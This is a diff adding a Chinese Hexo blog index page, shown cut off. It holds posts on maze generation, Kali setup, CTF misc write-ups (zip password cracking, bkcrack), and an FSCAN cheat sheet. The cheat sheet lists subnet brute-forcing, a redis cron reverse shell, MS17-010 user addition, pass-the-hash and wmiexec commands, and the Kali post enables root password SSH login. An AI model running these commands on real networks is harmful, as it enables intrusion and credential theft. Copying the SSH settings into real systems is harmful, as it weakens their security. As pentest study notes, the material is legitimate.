@@ -1,0 +1,859 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap">
+  
+    <article id="post-MAZE" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/06/01/MAZE/" class="article-date">
+  	<time datetime="2023-06-01T03:08:58.218Z" itemprop="datePublished">2023-06-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="MAZE"><a href="#MAZE" class="headerlink" title="MAZE"></a>MAZE</h1><h2 id="生成迷宫"><a href="#生成迷宫" class="headerlink" title="生成迷宫"></a>生成迷宫</h2><p>利用深度优先算法</p>
+<ol>
+<li>将地图重置<ul>
+<li>0代表路，1代表墙</li>
+<li>路不能相连，墙可以相连</li>
+<li>路周围的9个格子都是墙</li>
+<li>最外层是墙</li>
+</ul>
+</li>
+<li>随机一个入口坐标<ul>
+<li>坐标入口是路</li>
+</ul>
+</li>
+<li>生成路<ul>
+<li>将现在的位置入栈</li>
+<li>路相邻的四块路中随机选一个</li>
+<li>打通两条路之间的墙(1变为0)</li>
+<li>将现在的位置变为选中的路的位置</li>
+<li>将走过的路标记（数组）</li>
+<li>当前位置无路可走时，退一步重新查找</li>
+</ul>
+</li>
+</ol>
+<p>s</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-kali配置" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/06/01/kali%E9%85%8D%E7%BD%AE/" class="article-date">
+  	<time datetime="2023-06-01T03:08:58.216Z" itemprop="datePublished">2023-06-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="kali配置"><a href="#kali配置" class="headerlink" title="kali配置"></a>kali配置</h1><h2 id="更换语言"><a href="#更换语言" class="headerlink" title="更换语言"></a>更换语言</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su -		<span class="comment">#切换到root用户</span></span><br><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure>
+
+<h2 id="开启SSH"><a href="#开启SSH" class="headerlink" title="开启SSH"></a>开启SSH</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#随便找个地方添加这两句话</span></span><br><span class="line">PermitRootLogin <span class="built_in">yes</span></span><br><span class="line">PasswordAuthentication <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#启动服务</span></span><br><span class="line">sudo /etc/init.d/ssh start</span><br><span class="line"></span><br><span class="line"><span class="comment">#开机启动</span></span><br><span class="line">sudo update-rc.d ssh <span class="built_in">enable</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#更改开机密码</span></span><br><span class="line">sudo passwd</span><br></pre></td></tr></table></figure>
+
+<h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><p>个人偏好阿里云的源</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get update 			<span class="comment">#更新索引</span></span><br><span class="line">apt-get upgrade 		<span class="comment">#更新软件</span></span><br><span class="line">apt-get dist-upgrade 	<span class="comment">#升级</span></span><br><span class="line">apt-get clean 			<span class="comment">#删除缓存包</span></span><br><span class="line">apt-get autoclean 		<span class="comment">#删除未安装的deb包</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="给root用户安装vmtools"><a href="#给root用户安装vmtools" class="headerlink" title="给root用户安装vmtools"></a>给root用户安装vmtools</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get autoremove open-vm-tools</span><br><span class="line">apt-get install open-vm-tools-desktop</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-GDOU CTF" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/06/01/GDOU%20CTF/" class="article-date">
+  	<time datetime="2023-06-01T03:08:58.214Z" itemprop="datePublished">2023-06-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="GDOU-CTF"><a href="#GDOU-CTF" class="headerlink" title="GDOU CTF"></a>GDOU CTF</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Matryoshka"><a href="#Matryoshka" class="headerlink" title="Matryoshka"></a>Matryoshka</h3><p>思路:先将passwd文件中的英语替换成1-9，和+，*，-，%等几个字符，然后按照从左到右的顺序计算出结果，即可得到压缩包密码，如果出现负数，去掉负号即可。</p>
+<p>代码结合chatgpt写的，没有优化</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replace</span>(<span class="params">input_str</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">replace_string</span>(<span class="params">input_str</span>):</span><br><span class="line">        <span class="comment"># 定义一个字典，将单词替换为对应的数字</span></span><br><span class="line">        digits = &#123;<span class="string">&#x27;zero&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;one&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;two&#x27;</span>: <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;three&#x27;</span>: <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;four&#x27;</span>: <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;five&#x27;</span>: <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;six&#x27;</span>: <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;seven&#x27;</span>: <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;eight&#x27;</span>: <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;nine&#x27;</span>: <span class="string">&#x27;9&#x27;</span>&#125;</span><br><span class="line">        <span class="comment"># 遍历字典，将字符串中的单词替换为对应的数字</span></span><br><span class="line">        <span class="keyword">for</span> word, digit <span class="keyword">in</span> digits.items():</span><br><span class="line">            input_str = input_str.replace(word, digit)</span><br><span class="line">        input_str = input_str.replace(<span class="string">&#x27;plus&#x27;</span>, <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">        input_str = input_str.replace(<span class="string">&#x27;times&#x27;</span>, <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">        input_str = input_str.replace(<span class="string">&#x27;minus&#x27;</span>, <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">        input_str = input_str.replace(<span class="string">&#x27;mod&#x27;</span>, <span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">        input_str+=<span class="string">&#x27;+1&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> input_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(replace_string(input_str))</span></span><br><span class="line">    out_str=replace_string(input_str)</span><br><span class="line"></span><br><span class="line">    priority = &#123;<span class="string">&quot;+&quot;</span>: <span class="number">1</span>, <span class="string">&quot;-&quot;</span>: <span class="number">1</span>, <span class="string">&quot;*&quot;</span>: <span class="number">1</span>, <span class="string">&quot;/&quot;</span>: <span class="number">1</span>, <span class="string">&quot;%&quot;</span>:<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将中缀表达式转换为后缀表达式</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">infix_to_postfix</span>(<span class="params">expr</span>):</span><br><span class="line">        stack = []</span><br><span class="line">        postfix = []</span><br><span class="line">        x=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> expr:</span><br><span class="line">            <span class="keyword">if</span> ch.isdigit():</span><br><span class="line">                x=x*<span class="number">10</span>+<span class="built_in">int</span>(ch)</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                postfix.append(x)</span><br><span class="line">                x=<span class="number">0</span></span><br><span class="line">                <span class="keyword">while</span> stack <span class="keyword">and</span> priority.get(stack[-<span class="number">1</span>], <span class="number">0</span>) &gt;= priority.get(ch, <span class="number">0</span>):</span><br><span class="line">                    postfix.append(stack.pop())</span><br><span class="line">                stack.append(ch)</span><br><span class="line">        <span class="keyword">while</span> stack:</span><br><span class="line">            postfix.append(stack.pop())</span><br><span class="line">        <span class="keyword">return</span> postfix</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">postfix_to_parenthesis</span>(<span class="params">postfix</span>):</span><br><span class="line">        stack = []</span><br><span class="line">        operators = <span class="built_in">set</span>([<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;%&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> postfix:</span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">not</span> <span class="keyword">in</span> operators:</span><br><span class="line">                stack.append(char)</span><br><span class="line">            <span class="keyword">elif</span>(<span class="built_in">len</span>(stack) != <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    b, a = stack.pop(), stack.pop()</span><br><span class="line">                    stack.append(<span class="string">&#x27;(&#123;&#125;&#123;&#125;&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(a, char, b))</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> stack.pop()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    postfix = infix_to_postfix(out_str)</span><br><span class="line">    parenthesis = postfix_to_parenthesis(postfix)</span><br><span class="line">    result=<span class="built_in">eval</span>(parenthesis) </span><br><span class="line">    <span class="keyword">if</span> (result&lt;<span class="number">0</span>):result=<span class="number">0</span>-result</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压缩每个zip文件并获取密码字典</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1000</span>,-<span class="number">1</span>,-<span class="number">1</span>)):</span><br><span class="line">    zip_file = zipfile.ZipFile(<span class="string">f&#x27;Matryoshka<span class="subst">&#123;i&#125;</span>.zip&#x27;</span>)</span><br><span class="line">    password_dict_path = os.path.join(<span class="string">f&quot;password<span class="subst">&#123;i&#125;</span>.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(password_dict_path, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        passwords =  f.readlines()</span><br><span class="line">    pwd=<span class="built_in">str</span>(replace(passwords[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        zip_file.extractall(pwd=pwd.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="keyword">except</span> RuntimeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: Password &#x27;<span class="subst">&#123;pwd&#125;</span>&#x27; is incorrect for file &#x27;<span class="subst">&#123;zip_file.filename&#125;</span>&#x27;.&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    zip_file.close()</span><br><span class="line">    os.remove(<span class="string">f&#x27;Matryoshka<span class="subst">&#123;i&#125;</span>.zip&#x27;</span>)</span><br><span class="line">    os.remove(<span class="string">f&#x27;password<span class="subst">&#123;i&#125;</span>.txt&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="pixelart"><a href="#pixelart" class="headerlink" title="pixelart"></a>pixelart</h3><p>思路：拖到010打开发现结尾写着320x180，这张图片的像素是3840x2160，放大图片发现一些白点，间隔是12个像素，（3840x2160）&#x2F;（320x180）&#x3D;（12x12）</p>
+<p>所以每隔12个像素点提取出一个像素组成新的图片。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">im=Image.<span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\SharkChili\\Desktop\\arcaea.png&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(im.height,<span class="string">&#x27;x&#x27;</span>,im.width)</span><br><span class="line">a=Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">320</span>,<span class="number">180</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,im.width,<span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,im.height,<span class="number">12</span>):</span><br><span class="line">        rgb=im.getpixel((i,j))</span><br><span class="line">        a.putpixel((i//<span class="number">12</span>,j//<span class="number">12</span>),rgb)</span><br><span class="line">        </span><br><span class="line">a.save(<span class="string">&#x27;1.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>对新图片zsteg即可得到flag</p>
+<h3 id="getnopwd"><a href="#getnopwd" class="headerlink" title="getnopwd"></a>getnopwd</h3><p>下载后得到一个带密码的压缩包，由于只有压缩包，没有其它文件，首先想到伪加密，拖进010后发现是正常加密，然后想到爆破，6位纯数字没爆开，当时思路就断在这里了。</p>
+<p>后来看wp才了解到bkcrack这个工具。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -L getnopwd.zip</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230419210349.jpg" alt="QQ截图20230419210349"></p>
+<p>是Store，所以考虑明文攻击，pacpang文件的以些位是固定的，明文攻击最小是12bit，这里是满足的。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C getnopwd.zip -c final.pcapng  -x 8 4D3C2B1A01000000FFFFFFFFFFFFFFFF</span><br></pre></td></tr></table></figure>
+
+<p>​	<img src="/./assets/QQ%E6%88%AA%E5%9B%BE20230419211237.jpg" alt="QQ截图20230419211237"></p>
+<p>得到key后生成新的压缩包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bkcrack -C getnopwd.zip -k 3290bc3d 27d2d1d8 dfd4c1ae -U new.zip 123456</span><br></pre></td></tr></table></figure>
+
+<p>输入密码解压得到finall密码</p>
+<p>然后对其进行流量分析</p>
+<p>usb流量，看了wp才知道是数位板</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-FSCAN" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/06/01/FSCAN/" class="article-date">
+  	<time datetime="2023-06-01T03:08:58.213Z" itemprop="datePublished">2023-06-01</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>FSCAN</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 192.168.1.1/24  (默认使用全部模块)</span><br><span class="line">fscan.exe -h 192.168.1.1/16  (B段扫描)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -c <span class="built_in">whoami</span> (ssh 爆破成功后，命令执行)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) </span><br><span class="line">fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m smb -<span class="built_in">pwd</span> password (smb密码碰撞)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)</span><br><span class="line">fscan.exe -hf ip.txt  (以文件导入)</span><br><span class="line">fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -pa 3389 (在原基础上,加入3389-&gt;rdp扫描)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080 (只支持简单tcp功能的代理,部分功能的库不支持设置代理)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add (内置添加用户等功能,只适用于备选工具,更推荐其他ms17010的专项利用工具)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m smb2 -user admin -<span class="built_in">hash</span> xxxxx (pth <span class="built_in">hash</span>碰撞,xxxx:ntlmhash,如32ed87bdb5fdc5e9cba88547376818d4)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -<span class="built_in">pwd</span> password -c xxxxx (wmiexec无回显命令执行)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">-c string</span><br><span class="line">      ssh命令执行</span><br><span class="line">-cookie string</span><br><span class="line">      设置cookie</span><br><span class="line">-debug int</span><br><span class="line">      多久没响应,就打印当前进度(default 60)</span><br><span class="line">-domain string</span><br><span class="line">      smb爆破模块时,设置域名</span><br><span class="line">-h string</span><br><span class="line">      目标ip: 192.168.11.11 | 192.168.11.11-255 | 192.168.11.11,192.168.11.12</span><br><span class="line">-hf string</span><br><span class="line">      读取文件中的目标</span><br><span class="line">-hn string</span><br><span class="line">      扫描时,要跳过的ip: -hn 192.168.1.1/24</span><br><span class="line">-m string</span><br><span class="line">      设置扫描模式: -m ssh (default <span class="string">&quot;all&quot;</span>)</span><br><span class="line">-no</span><br><span class="line">      扫描结果不保存到文件中</span><br><span class="line">-nobr</span><br><span class="line">      跳过sql、ftp、ssh等的密码爆破</span><br><span class="line">-nopoc</span><br><span class="line">      跳过web poc扫描</span><br><span class="line">-np</span><br><span class="line">      跳过存活探测</span><br><span class="line">-num int</span><br><span class="line">      web poc 发包速率  (default 20)</span><br><span class="line">-o string</span><br><span class="line">      扫描结果保存到哪 (default <span class="string">&quot;result.txt&quot;</span>)</span><br><span class="line">-p string</span><br><span class="line">      设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default <span class="string">&quot;21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017&quot;</span>)</span><br><span class="line">-pa string</span><br><span class="line">      新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)</span><br><span class="line">-path string</span><br><span class="line">      fcgi、smb romote file path</span><br><span class="line">-ping</span><br><span class="line">      使用ping代替icmp进行存活探测</span><br><span class="line">-pn string</span><br><span class="line">      扫描时要跳过的端口,as: -pn 445</span><br><span class="line">-pocname string</span><br><span class="line">      